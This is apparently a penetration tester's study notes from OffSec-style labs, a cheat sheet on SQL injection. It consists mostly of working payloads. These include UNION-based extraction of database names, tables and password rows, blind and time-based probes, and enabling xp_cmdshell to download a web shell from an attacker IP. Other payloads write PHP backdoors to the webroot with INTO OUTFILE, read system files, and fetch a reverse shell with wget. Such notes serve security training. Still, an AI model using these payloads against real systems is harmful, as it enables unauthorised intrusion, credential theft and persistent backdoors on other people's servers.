#webapp 

SQLite Injection - https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf

URL Encode - 

[[Lessons Learned]]
data
### Connecting to database

##### mysql

```bash
mysql -u root -p'root' -h 192.168.50.16 -P 3306
```
[[MySQL]]

##### MSSQL

```bash
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
```


[[MSSQL]]

##### POSTgreSQL

[PayloadsAllTheThings/PostgreSQL Injection.md at master · swisskyrepo/PayloadsAllTheThings · GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-error-based)


```sql
; DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'cat /var/www/flag.txt'; SELECT * FROM users WHERE 1=cast((SELECT cmd_output FROM cmd_exec)::text AS NUMERIC);
```

### Basic

🔴 // is for any whitespace truncation
```sql
offsec' OR 1=1 -- //
```

```sql
' or 1=1 in (select @@version) -- //
```


```SQL
SELECT * from blog where id=2;-- ## or ;#
```
### Column Number Enumeration

```sql
http://10.11.0.22/debug.php?id=1 order by 1
```

	Increment until you see an error, because this tells to order by 1st column, 2nd column etc

### Steps on Error Based SQLi

1. Check For errors - use '  or "
2. Union column check 

	1,2,3 is just printing the numbers and when the column amount is matched it will show these values, then use the shown values to extract the info you need
	EX: 2,3 -> 2,database()

Use a high number below to find the 
```SQL
' ORDER BY 1-- //
```

```SQL
1 UNION SELECT 1, 2, 3
```
3. Get non existing data
```SQL
0 UNION SELECT 1, 2, 3
```
4. Check database name
```SQL
0 UNION SELECT 1,2,database()
```
5. Check table names
```SQL
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
```

OR if the showed column number in the webapp is not the last

```sql
' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
```

4. Check column names
```SQL
0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
```
5. Read the rows
```SQL
0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
```

```sql
' UNION SELECT null, username, password, description, null FROM users -- //
```

### SQLI to Command Executions

##### Enabling the feature

```sql
EXECUTE sp_configure 'show advanced options', 1;
```

```sql
RECONFIGURE;
```

```sql
EXECUTE sp_configure 'xp_cmdshell', 1;
```

```sql
RECONFIGURE;
```

```sql
111'; DECLARE @sTableDiff varchar(1000); SET @sTableDiff= 'powershell -c "(new-object System.Net.WebClient).DownloadFile(''http://192.168.45.178/cmd.aspx'',''c:\inetpub\wwwroot\cmd.aspx'')"'; EXEC xp_cmdshell @sTableDiff; -- -
```
- variable is declared because otherwise the max is 128 chars
- double '  are there because the it needs to be escaped
- trying out the connection use below

```sql
powershell Invoke-WebRequest -Uri http://192.168.45.219
```


##### UNION Based backdoor
- Location is DOCUMENT_ROOT in phpinfo

```sql
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```

or if single parameter( [[Hawat]])

```sql
Normal' UNION SELECT "<?php echo system($_GET['cmd']);?>" INTO OUTFILE '/srv/http/cma.php' -- //
```


```sql
?id=1 union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')
```

```sql
id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'
```

After this if you want a rev shell(make sure to URL encode it)

```html
cmd=wget http://192.168.118.3:443/rev.txt -O /srv/http/rev.php'
```


### Blind Boolian SQLi

Use the previous steps but try to make false into True using UNION
🔴 if the user exist only will return result
```sql
http://192.168.50.16/blindsqli.php?user=offsec' AND 1=1 -- //
```

```sql
http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
```



### Time Based SQL
```SQL
admin123' UNION SELECT SLEEP(5),2;--
```




